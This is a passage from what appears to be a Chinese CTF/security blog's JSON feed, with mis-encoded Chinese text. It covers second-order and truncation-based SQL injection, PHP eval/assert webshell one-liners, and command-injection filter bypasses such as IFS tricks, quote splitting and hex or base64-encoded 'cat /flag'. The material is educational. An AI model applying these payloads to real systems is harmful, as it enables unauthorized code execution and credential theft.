style=\"text-align:center\">id</th>\n<th style=\"text-align:center\">username</th>\n<th style=\"text-align:center\">password</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">admin</td>\n<td style=\"text-align:center\">password</td>\n</tr>\n</tbody>\n</table>\n<p>å‡è®¾ä¸€ä¸ªè¡¨å¦‚ä¸Šå›¾ï¼Œç”¨æˆ·è¾“å…¥:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> wp_user <span class=\"keyword\">values</span>(<span class=\"number\">2</span>,<span class=\"string\">&#x27;admin\\&#x27;</span><span class=\"keyword\">or</span>\\<span class=\"string\">&#x27;1&#x27;</span>,<span class=\"string\">&#x27;some pass&#x27;</span>);</span><br></pre></td></tr></table></figure>\n<p>æ­¤æ—¶åº“çš„å†…å®¹æ˜¯:</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">id</th>\n<th style=\"text-align:center\">username</th>\n<th style=\"text-align:center\">password</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:center\">adminâ€™orâ€™1</td>\n<td style=\"text-align:center\">somepass</td>\n</tr>\n</tbody>\n</table>\n<p>å¼•å·è¢«è½¬ä¹‰ï¼Œæ­£å¸¸å…¥åº“ï¼Œä½†æ˜¯å½“è¿™ä¸ªç”¨æˆ·åè¢«å†æ¬¡ä½¿ç”¨æ—¶</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$res</span>=<span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"variable\">$conn</span>,<span class=\"string\">&quot;SELECT password from wp_user where username=&#x27;<span class=\"subst\">$name</span>&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>æ­¤æ—¶ SQL è¯­å¥ä¸º</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> password <span class=\"keyword\">from</span> wp_user <span class=\"keyword\">where</span> username<span class=\"operator\">=</span><span class=\"string\">&#x27;admin&#x27;</span><span class=\"keyword\">or</span><span class=\"string\">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p>æ­¤æ—¶äº§ç”Ÿæ³¨å…¥</p>\n<h3 id=\"4å­—ç¬¦ä¸²æˆªæ–­\"><a class=\"markdownIt-Anchor\" href=\"#4å­—ç¬¦ä¸²æˆªæ–­\">#</a> 4. å­—ç¬¦ä¸²æˆªæ–­</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$title</span>=<span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;title&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$title</span>=<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$title</span>,<span class=\"number\">0</span>,<span class=\"number\">10</span>);</span><br><span class=\"line\"><span class=\"variable\">$content</span>=<span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;INSERT INTO wp_news VALUES(2,&#x27;<span class=\"subst\">$title</span>&#x27;,&#x27;<span class=\"subst\">$content</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>\n<p>å‡å¦‚è¾“å…¥ aaaaaaaaaâ€™,</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">è‡ªåŠ¨è½¬ä¹‰ä¸ºaaaaaaaaa\\&#x27;,ç”±äºå­—ç¬¦ä¸²é•¿åº¦é™åˆ¶è¢«æˆªå–ä¸ºaaaaaaaaa\\,è½¬ä¹‰äº†é¢„ç½®çš„å•å¼•å·,å°±èƒ½æ³¨å…¥äº†</span><br><span class=\"line\">?title=aaaaaaaaa&#x27;&amp;content=,1,1),(3,4,(select pwd from wp_user limit 1),1)#</span><br></pre></td></tr></table></figure>\n<p>sql è¯­å¥æ˜¯</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">values</span>(<span class=\"number\">2</span>,<span class=\"string\">&#x27;aaaaaaaaa&#x27;</span>,<span class=\"string\">&#x27;,1,1),(3,4,(select pwd from wp_user limit 1),1)#&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>æ­¤æ—¶è¡¨</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">id</th>\n<th style=\"text-align:center\">title</th>\n<th style=\"text-align:center\">content</th>\n<th style=\"text-align:center\">time</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">this is title</td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">1</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:center\">aaaaaaaaaâ€™,</td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">1</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:center\">4</td>\n<td style=\"text-align:center\">admin_password</td>\n<td style=\"text-align:center\">1</td>\n</tr>\n</tbody>\n</table>\n<p>å¯å‘ç°æ–°åŠ äº†ä¸¤è¡Œï¼ŒæˆåŠŸæ³¨å…¥</p>\n<p>mid () å‡½æ•°<br>\n select mid (column_name,start,length)<br>\n right () å‡½æ•°<br>\nä»æŒ‡å®šå­—ç¬¦ä¸²çš„<mark>å³ä¾§</mark>æå–ç»™å®šé•¿åº¦çš„å­—ç¬¦<br>\n select right (column_name,length)<br>\n substr () å‡½æ•°<br>\nä¸ mid () ä¸€æ ·<br>\n reverse () å‡½æ•°<br>\nåè½¬å­—ç¬¦ä¸²</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/",
            "url": "https://hq185187.github.io/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/",
            "title": "å‘½ä»¤æ‰§è¡Œæ¼æ´åŠç»•è¿‡æ–¹æ³•",
            "date_published": "2023-04-28T11:14:02.548Z",
            "content_html": "<h2 id=\"ä»£ç æ‰§è¡Œ\"><a class=\"markdownIt-Anchor\" href=\"#ä»£ç æ‰§è¡Œ\">#</a> ä»£ç æ‰§è¡Œ</h2>\n<p>ä»£ç æ‰§è¡Œï¼šæœªä¸¥æ ¼è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„å‚æ•°ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥é€šè¿‡ä¼ å‚åœ¨ web æœåŠ¡å™¨ä¸Š<mark>æ‰§è¡Œæ¶æ„ä»£ç .</mark><br>\n å¯å˜å‡½æ•°ï¼šä¸€ä¸ªå˜é‡ååé¢å¦‚æœæœ‰åœ†æ‹¬å·ï¼Œphp å°†å¯»æ‰¾åŒåå‡½æ•°è°ƒç”¨</p>\n<p>eval: å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸º php ä»£ç æ‰§è¡Œ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval($_POST[&#x27;123&#x27;])</span><br></pre></td></tr></table></figure>\n<p>eval æ˜¯ä¸€ä¸ªè¯­è¨€æ„é€ å™¨ï¼Œä¸æ˜¯å‡½æ•°ï¼Œä¸èƒ½å½“å¯å˜å‡½æ•°</p>\n<p>assert (): æ‰§è¡Œä¸€ä¸ªæœ‰è¿”å›å€¼çš„ php è¡¨è¾¾å¼</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assert($_POST[&#x27;123&#x27;])</span><br></pre></td></tr></table></figure>\n<p>php7.2 ä»¥åä¸ eval ä¸€æ ·æ˜¯è¯­è¨€æ„é€ å™¨ä¸æ˜¯å‡½æ•°</p>\n<p>call_user_func (): æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ä½¿ç”¨ï¼Œå…¶ä»–å‚æ•°æ˜¯å›è°ƒå‡½æ•°å‚æ•°</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call_user_func(&#x27;assert&#x27;,&#x27;eval($_POST[&#x27;123&#x27;])&#x27;)</span><br></pre></td></tr></table></figure>\n<p>call_user_func_array (): æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‚æ•°ä½¿ç”¨ï¼Œç¬¬äºŒä¸ªæ•°ç»„ç±»å‹ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call_user_func_array(&#x27;assert&#x27;,[&#x27;eval($__POST[&#x27;123&#x27;])&#x27;])</span><br></pre></td></tr></table></figure>\n<p>array_map (): ä¸ºæ•°ç»„çš„æ¯ä¸€ä¸ªå…ƒç´ åº”ç”¨å›è°ƒå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å›è°ƒå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ•°ç»„</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array_map(&#x27;assert&#x27;,[&#x27;eval($POST[&#x27;123&#x27;])&#x27;])</span><br></pre></td></tr></table></figure>\n<p>array_filter (): ä½¿ç”¨å›è°ƒå‡½æ•°è¿‡æ»¤æ•°ç»„ä¸­çš„å…ƒç´ ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ•°ç»„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å›è°ƒå‡½æ•°</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array_filter([&#x27;eval($__POST[&#x27;123&#x27;])&#x27;],&#x27;assert&#x27;)</span><br></pre></td></tr></table></figure>\n<p>array_reduce (): å‘é€æ•°ç»„ä¸­çš„å€¼åˆ°å›è°ƒå‡½æ•°è°ƒç”¨</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array_reduce([1,2],&#x27;assert&#x27;,&#x27;phpinfo()&#x27;)</span><br></pre></td></tr></table></figure>\n<p>phpinfo () æ˜¯å‘é€çš„ç¬¬ä¸€ä¸ªå‚æ•°</p>\n<p>preg_replace (): å°†åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²æ›¿æ¢ä¸ºæŒ‡å®šçš„å­—ç¬¦ä¸²å¹¶è¿”å›å®Œæ•´å­—ç¬¦ä¸²</p>\n<h2 id=\"å‘½ä»¤æ‰§è¡Œ\"><a class=\"markdownIt-Anchor\" href=\"#å‘½ä»¤æ‰§è¡Œ\">#</a> å‘½ä»¤æ‰§è¡Œ</h2>\n<p>æœªä¸¥æ ¼è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„å‚æ•°ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥é€šè¿‡ä¼ å‚åœ¨ web æœåŠ¡å™¨<mark>ç»ˆç«¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</mark></p>\n<p>system()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system(whoami)</span><br></pre></td></tr></table></figure>\n<p>passthru()<br>\n åŒ system ()</p>\n<p>exec (): é»˜è®¤æ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦æ‰‹åŠ¨åŠ ä¸Š echo. è€Œä¸”å›æ˜¾åªä¼šè¾“å‡ºä¸€è¡Œç»“æœï¼Œå› æ­¤ç»å¸¸ç”¨ç¬¬äºŒä¸ªæ•°ç»„å‚æ•°æ¥æ”¶å¤šè¡Œç»“æœ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$arr=[];</span><br><span class=\"line\">echo exec(&#x27;ipconfig&#x27;,$arr);</span><br><span class=\"line\">var_dump($arr);</span><br></pre></td></tr></table></figure>\n<p>shell_exec (): é»˜è®¤æ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦æ‰‹åŠ¨åŠ ä¸Š echo, å¯ä»¥è¾“å‡ºå¤šè¡Œç»“æœ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$arr=[];</span><br><span class=\"line\">echo shell_exec(&#x27;ipconfig&#x27;);</span><br></pre></td></tr></table></figure>\n<p>åå¼•å·ï¼šåå¼•å·å†…çš„ä»£ç è¢«å½“ä½œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œï¼Œé»˜è®¤æ²¡æœ‰å›æ˜¾</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo `ipconfig`;</span><br></pre></td></tr></table></figure>\n<p>popen (): æ‰“å¼€ä¸€ä¸ªæŒ‡å‘è¿›ç¨‹çš„é€šé“ï¼Œè¯¥è¿›ç¨‹ç”±æ´¾ç”Ÿç»™å®šçš„ command å‘½ä»¤æ‰§è¡Œè€Œç”Ÿäº§</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$fp=popen(&#x27;whoami&#x27;,&#x27;r&#x27;);</span><br><span class=\"line\">while(!feof($fp))&#123;</span><br><span class=\"line\">$content=fgetss($fp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo $content;</span><br></pre></td></tr></table></figure>\n<h2 id=\"åŸºç¡€\"><a class=\"markdownIt-Anchor\" href=\"#åŸºç¡€\">#</a> åŸºç¡€</h2>\n<h3 id=\"1è½¬ä¹‰å­—ç¬¦\"><a class=\"markdownIt-Anchor\" href=\"#1è½¬ä¹‰å­—ç¬¦\">#</a> 1. è½¬ä¹‰å­—ç¬¦</h3>\n<p>Windows ä¸‹æ˜¯ ^  Linux ä¸‹æ˜¯ \\</p>\n<h3 id=\"2å¤šæ¡å‘½ä»¤æ‰§è¡Œ\"><a class=\"markdownIt-Anchor\" href=\"#2å¤šæ¡å‘½ä»¤æ‰§è¡Œ\">#</a> 2. å¤šæ¡å‘½ä»¤æ‰§è¡Œ</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows:&amp;&amp;,||,%0a</span><br><span class=\"line\">linux:&amp;&amp;,||,;,$(),``,%0a,%0d</span><br></pre></td></tr></table></figure>\n<p>%0a å’Œ %0d æ˜¯ç”±äºæ¢è¡Œæ‰å¯ä»¥å¤šæ¡å‘½ä»¤æ‰§è¡Œ<br>\n<mark> Linux ä¸‹åŒå¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸² $() ä¼šè¢«å½“åšå‘½ä»¤æ‰§è¡Œï¼Œå•å¼•å·å•çº¯å°±æ˜¯å­—ç¬¦ä¸²</mark></p>\n<h3 id=\"3æ³¨é‡Šç¬¦å·\"><a class=\"markdownIt-Anchor\" href=\"#3æ³¨é‡Šç¬¦å·\">#</a> 3. æ³¨é‡Šç¬¦å·</h3>\n<p>Windows:&quot;::&quot;<br>\nLinux:&quot;#&quot;</p>\n<h2 id=\"å¸¸è§è¿æ¥ç¬¦ç®¡é“ç¬¦\"><a class=\"markdownIt-Anchor\" href=\"#å¸¸è§è¿æ¥ç¬¦ç®¡é“ç¬¦\">#</a> å¸¸è§è¿æ¥ç¬¦ (ç®¡é“ç¬¦)</h2>\n<ol>\n<li>|ï¼šA|B ä¸ç®¡ A å‘½ä»¤æˆåŠŸä¸å¦ï¼Œéƒ½ä¼šå»æ‰§è¡Œ b å‘½ä»¤ã€‚</li>\n<li>&amp;ï¼šA&amp;B å„è‡ªæ‰§è¡Œ</li>\n<li>||ï¼šA||B å…ˆæ‰§è¡Œ Aï¼Œå¦‚æœä¸ºå‡ï¼Œæ‰æ‰§è¡Œ B</li>\n<li>&amp;&amp; ï¼šA&amp;&amp;B å…ˆæ‰§è¡Œ Aï¼Œå¦‚æœä¸ºçœŸï¼Œæ‰æ‰§è¡Œ B</li>\n<li>ï¼›ï¼š A;B å…ˆæ‰§è¡Œ A åæ‰§è¡Œ B</li>\n</ol>\n<p>å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤:</p>\n   <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systeminfo æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</span><br><span class=\"line\">ipconfig  æŸ¥çœ‹æœ¬åœ°ç½‘ç»œ</span><br><span class=\"line\">net  user  æŸ¥çœ‹ç³»ç»Ÿç”¨æˆ·</span><br><span class=\"line\">dir  æŸ¥çœ‹å½“å‰ç›®å½•</span><br><span class=\"line\">whoami ç”¨æˆ·å</span><br><span class=\"line\">veræ“ä½œç³»ç»Ÿ (username -a)</span><br><span class=\"line\">netstat ç½‘ç»œè¿æ¥ (Linuxæ˜¯netstat -an)</span><br><span class=\"line\">tasklist è¿è¡Œè¿›ç¨‹(Linuxæ˜¯ps -ef)</span><br></pre></td></tr></table></figure>\n<h2 id=\"ç»•è¿‡æ–¹æ³•\"><a class=\"markdownIt-Anchor\" href=\"#ç»•è¿‡æ–¹æ³•\">#</a> ç»•è¿‡æ–¹æ³•</h2>\n<h3 id=\"1ç©ºæ ¼ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#1ç©ºæ ¼ç»•è¿‡\">#</a> 1. ç©ºæ ¼ç»•è¿‡</h3>\n<p>1. <code>$&#123;IFS&#125;,&#123;IFS&#125;,$IFS,&lt;,&lt;&gt;,</code> <br>\n2.$IFS$9 $9 æŒ‡ä¼ è¿‡æ¥çš„ç¬¬ 9 ä¸ªå‚æ•°<br>\n 3.%09 ,%0b,%0c ç­‰ï¼Œå¯ä»¥ç”¨ burp åœ¨ %00-% ff ä¹‹é—´çˆ†ç ´<br>\n 4. å­—ç¬¦ä¸²æˆªå–<br>\n 1.Windows ä¸‹:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%ProgramFiles:~10,1%</span><br><span class=\"line\">~æ˜¯æˆªå–ç¬¦,è¡¨ç¤ºè·å–ç¯å¢ƒå˜é‡%ProgramFiles%çš„å€¼,ä¸€èˆ¬æ˜¯C:\\Program Files,è¿™ä¸ªå‘½ä»¤åœ¨æŠŠå®ƒç¬¬åä½æˆªå–ä¸€ä½,å°±æ˜¯ç©ºæ ¼</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo%ProgramFiles:~10,1%111</span><br><span class=\"line\">111</span><br></pre></td></tr></table></figure>\n<p>2.Linux ä¸‹:<br>\n(1)$IFS$9<br>\n (2){cmd,args}  bash æœ‰æ•ˆï¼Œzsh å’Œ dash æ— æ•ˆ<br>\n (3) è¯»å–æ–‡ä»¶æ—¶:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat&lt;&gt;flag</span><br></pre></td></tr></table></figure>\n<p>æ³¨æ„ï¼šå¯ä»¥è®© IFS=, æ¥è¿›è¡Œæ³¨å…¥</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo;IFS=,;cat flag</span><br><span class=\"line\">echo;IFS=,;whoami</span><br></pre></td></tr></table></figure>\n<p>4.&lt;æˆ–è€… &lt;&gt; é‡å®šå‘</p>\n<h2 id=\"2é»‘åå•ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#2é»‘åå•ç»•è¿‡\">#</a> 2. é»‘åå•ç»•è¿‡</h2>\n<p>1. å˜é‡æ‹¼æ¥</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=c;b=at;c=fl;d=ag;$a$b$c$d</span><br></pre></td></tr></table></figure>\n<p>2. å•å¼•å·ï¼ŒåŒå¼•å·ç»•è¿‡</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ca&#x27;&#x27;t flag</span><br><span class=\"line\">cat&quot;&quot; flag</span><br></pre></td></tr></table></figure>\n<h2 id=\"3ç¼–ç ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#3ç¼–ç ç»•è¿‡\">#</a> 3. ç¼–ç ç»•è¿‡</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.$(printf &quot;\\154\\163&quot;) ==&gt;ls</span><br><span class=\"line\">2.$(printf &quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;) ==&gt;cat /flag</span><br><span class=\"line\">3.</span><br><span class=\"line\">&#123;printf,&quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;&#125;|\\$0 ==&gt;cat /flag</span><br></pre></td></tr></table></figure>\n<h2 id=\"4è¯»æ–‡ä»¶ç»•è¿‡å½“catè¢«è¿‡æ»¤\"><a class=\"markdownIt-Anchor\" href=\"#4è¯»æ–‡ä»¶ç»•è¿‡å½“catè¢«è¿‡æ»¤\">#</a> 4. è¯»æ–‡ä»¶ç»•è¿‡ (å½“ cat è¢«è¿‡æ»¤)</h2>\n<p>(1) more: ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹<br>\n (2) less: ä¸ more ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æ›´å¥½çš„æ˜¯ï¼Œä»–å¯ä»¥ [pg dn][pg up] ç¿»é¡µ<br>\n (3) head: æŸ¥çœ‹å¤´å‡ è¡Œ<br>\n (4) tac: ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º<br>\n (5) tail: æŸ¥çœ‹å°¾å‡ è¡Œ<br>\n (6) nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·<br>\n (7) od: ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹<br>\n (8) vi: ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br>\n (9) vim: ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br>\n (10) sort: å¯ä»¥æŸ¥çœ‹<br>\n (11) uniq: å¯ä»¥æŸ¥çœ‹<br>\n (12) file -f: æŠ¥é”™å‡ºå…·ä½“å†…å®¹</p>\n<h2 id=\"5åæ–œçº¿\"><a class=\"markdownIt-Anchor\" href=\"#5åæ–œçº¿\">#</a> 5. åæ–œçº¿</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c\\at fl\\ag</span><br></pre></td></tr></table></figure>\n<h2 id=\"612ç­‰å’Œ\"><a class=\"markdownIt-Anchor\" href=\"#612ç­‰å’Œ\">#</a> 6.$1,<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>2</mn><mtext>ç­‰å’Œ</mtext></mrow><annotation encoding=\"application/x-tex\">2ç­‰å’Œ</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord cjk_fallback\">ç­‰</span><span class=\"mord cjk_fallback\">å’Œ</span></span></span></span> @</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c$1at fl$@ag</span><br></pre></td></tr></table></figure>\n<h2 id=\"7é€šé…ç¬¦ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#7é€šé…ç¬¦ç»•è¿‡\">#</a> 7. é€šé…ç¬¦ç»•è¿‡</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;?&quot;ä»£è¡¨ä¸€ä¸ªå­—ç¬¦,&quot;*&quot;ä»£è¡¨ä¸€ä¸²å­—ç¬¦</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class=\"line\">2.?at flag</span><br><span class=\"line\">3.?at ????</span><br><span class=\"line\">4.?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[]è¡¨ç¤ºä¸€ä¸ªèŒƒå›´(æ­£åˆ™),eg[abcd]åŒ¹é…a,b,c,d</span><br><span class=\"line\">&#123;&#125;äº§ç”Ÿä¸€ä¸ªåºåˆ—</span><br></pre></td></tr></table></figure>\n<h2 id=\"8å†…æ•›æ‰§è¡Œç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#8å†…æ•›æ‰§è¡Œç»•è¿‡\">#</a> 8. å†…æ•›æ‰§è¡Œç»•è¿‡</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">zxcv0221@kali:~/æ¡Œé¢$ echo &quot;m0re`cat flag`&quot;</span><br><span class=\"line\">m0reyou are good!</span><br><span class=\"line\">zxcv0221@kali:~/æ¡Œé¢$ echo &quot;m0re $(cat flag)&quot;</span><br><span class=\"line\">m0re you are good!</span><br><span class=\"line\">zxcv0221@kali:~/æ¡Œé¢$ echo &quot;m0re $(pwd)&quot;</span><br><span class=\"line\">m0re /home/zxcv0221/æ¡Œé¢</span><br></pre></td></tr></table></figure>\n<h2 id=\"9ç¼–ç ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#9ç¼–ç ç»•è¿‡\">#</a> 9. ç¼–ç ç»•è¿‡</h2>\n<p><code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d</code> <br>\n æœ‰çš„é¢˜ç›®è¿‡æ»¤äº† bash, å¯ä»¥ç”¨ sh</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span 